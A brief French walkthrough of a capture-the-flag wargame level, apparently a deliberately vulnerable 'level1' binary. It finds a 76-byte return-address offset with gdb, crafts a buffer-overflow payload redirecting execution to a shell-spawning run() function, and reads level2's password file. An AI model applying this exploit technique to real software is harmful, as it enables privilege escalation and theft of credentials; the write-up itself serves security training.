on voit dans le source.c qu'on a pu avoir avec ghidra qu'il y a deux fonction dans le binaire

Dans la fonction run() il y a possibilite d'executer un shell avec les droits de level2

Dans le main() y a un segfault possible si on depasse un certain nombre d'octet que nous allons determine qvec gdb

python -c 'print "e" * 78' > /tmp/test

on execute level1 dans gdb avec l'entre dans /tmp/test : run < /tmp/test 
On voit que gdb nous indique une segfault a l'adresse 0xb7006565.
'65' correspand au caractere 'e', donc 2 'e' ont été marquer ce qui veut dire que RET se trouve a 78 - 2 = 76 octets

on va donc essayer d'acceder a run() en fixant le RET sur l'adresse 0x08048444 qui est l'adresse de run()

python -c 'print "e" * 76 + "\x44\x84\x04\x08"' > /tmp/payload

(on ajoute un cat avec '-' pour garder le stdin ouvert et continuer a ecrire dans le shell sinon
il va juste se fermer a la fin de run)

cat /tmp/payload - | ./level1

Bingo ! On a lance le shell, il n'y a plus qu'a :

cat /home/user/level2/.pass



